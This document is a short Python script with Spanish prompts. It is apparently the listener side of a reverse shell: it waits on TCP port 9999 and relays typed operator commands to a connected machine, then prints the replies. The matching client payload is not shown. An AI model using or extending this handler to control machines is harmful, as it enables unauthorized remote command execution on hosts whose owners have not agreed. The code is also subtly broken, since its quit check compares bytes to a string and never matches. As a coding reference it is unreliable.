import socket


host = ''
port = 9999 


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


s.bind((host,port))


s.listen(10)
print ("Esperando conexiones en el puerto: " + str(port))

def aceptar_conexiones():
    conn,addr = s.accept()
    print ("Conectado a " + addr[0])
    comandos(conn)
    conn.close()

def comandos(conn):
    while True:
        cmd = input("Command> ")
        
        if str.encode(cmd) == 'q':break

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            respuesta = str(conn.recv(1024) )
            print (respuesta) 
            
aceptar_conexiones()
